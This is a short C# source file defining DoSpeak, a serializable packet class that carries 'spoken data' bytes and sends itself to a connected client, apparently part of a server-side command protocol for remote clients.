using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets {

    [Serializable]
    public class DoSpeak : IPacket {

        public byte[] SpokenData { get; set; }
        
        public DoSpeak() {
            
        }

        public DoSpeak(byte[] spokenData) {
            SpokenData = spokenData;
        }
        
        public void Execute(Client client) {
            client.Send(this);
        }
    }
}
